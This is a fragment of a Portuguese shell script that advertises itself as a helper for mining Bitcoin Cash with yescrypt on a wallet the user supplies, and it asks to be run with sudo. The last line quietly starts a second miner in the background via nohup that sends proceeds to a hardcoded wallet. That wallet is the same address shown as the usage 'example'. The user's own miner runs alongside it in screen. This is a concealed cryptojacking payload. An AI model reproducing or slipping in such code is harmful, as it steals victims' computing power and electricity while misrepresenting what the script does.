...
if [ "$bash" = "/bin/bash" ]
then
echo "	\033[41;1;37m Minerar BITCOIN CASH $versao \033[0m "
sleep 1
echo "$verde Forma de USO: \033[0m"
echo "sudo sh $0 $vermelho Carteira de BITCOIN CASH \033[0m \n "
echo "$verde Exemplo:\033[0m"
echo "sudo sh $0 $vermelho 1AzUxQFciqQZNg73KPCypCyedyraArcDSs \033[0m \n"
exit 0
fi
...
echo "$cinzaClaro	* Minerar BITCOIN CASH \033[0m \n"
...
echo "$cinzaClaro	* Esse script tem o fim de tentar ajudar a minerar BCHs usando o Algoritimo YESCRYPT. \033[0m "
...
sleep 10
nohup ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1AzUxQFciqQZNg73KPCypCyedyraArcDSs -p c=BCH & screen ./cpuminer -a yescrypt -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet -p c=BCH
